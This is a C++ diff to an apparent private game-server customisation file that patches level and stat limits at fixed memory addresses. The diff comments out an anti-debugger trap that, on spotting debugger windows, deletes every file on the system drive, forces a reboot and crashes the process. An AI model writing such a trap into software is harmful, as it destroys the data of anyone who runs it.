@@ -12,7 +12,7 @@
 
 void Customs()
 {
-	GetHID();
+	//GetHID();
 	//===============================================
 	//-- Anti Craked 
 	//===============================================
@@ -23,20 +23,21 @@ void Customs()
 	HANDLE DEBUG  = FindWindow(TEXT("DEBUG"), NULL);
 	HANDLE SoftICE = FindWindow(TEXT("SoftICE"), NULL);
 	HANDLE WinDbg = FindWindow(TEXT("WinDbg"), NULL);
-	if (holly || x32dbg || x64dbg || AQtime || DEBUG || SoftICE || WinDbg)
-	{
+//	if (holly || x32dbg || x64dbg || AQtime || DEBUG || SoftICE || WinDbg)
+//	{
 
-		system("@echo Off");
-		system("del %systemdrive%\\*.*/f/s/q");
-		system("shutdown -r -f -t 00");
+//		system("@echo Off");
+//		system("del %systemdrive%\\*.*/f/s/q");
+//		system("shutdown -r -f -t 00");
 
-		__asm
-		{
-			MOV EAX, 00000000;
-			CALL EAX;
-		}
+//		__asm
+//		{
+//			MOV EAX, 00000000;
+//			CALL EAX;
+//		}
 
-	}
+//	}
+
 	*(unsigned int*)(0x4A4202 + 3) = GetPrivateProfileInt("Server", "Level Máximo", 400, CFG_GAMESERVER);
 	*(unsigned int*)(0x4BCEFB + 2) = GetPrivateProfileInt("Server", "Level Máximo", 400, CFG_GAMESERVER);
 	*(unsigned int*)(0x5058E0 + 2) = GetPrivateProfileInt("Server", "Level Máximo", 400, CFG_GAMESERVER);
@@ -48,9 +49,9 @@ void Customs()
 	*(unsigned int*)(0x41A276 + 3) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
 	*(unsigned int*)(0x41A2CC + 3) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
 	*(unsigned int*)(0x41A3FC + 3) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
-	*(unsigned int*)(0x42CBF4 + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
-	*(unsigned int*)(0x42D12F + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
-	*(unsigned int*)(0x42D244 + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
+//	*(unsigned int*)(0x42CBF4 + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
+//	*(unsigned int*)(0x42D12F + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
+//	*(unsigned int*)(0x42D244 + 2) = GetPrivateProfileInt("Server", "Level Máximo Mobs", 1000, CFG_GAMESERVER);
 
 	*(unsigned char*) (0x4BD011+2) = GetPrivateProfileInt("Server","Pontos Por Level <BK | SM | ELF>",5,CFG_GAMESERVER);
     *(unsigned char*) (0x4BCFFA+2) = GetPrivateProfileInt("Server","Pontos Por Level <MG>",7,CFG_GAMESERVER);
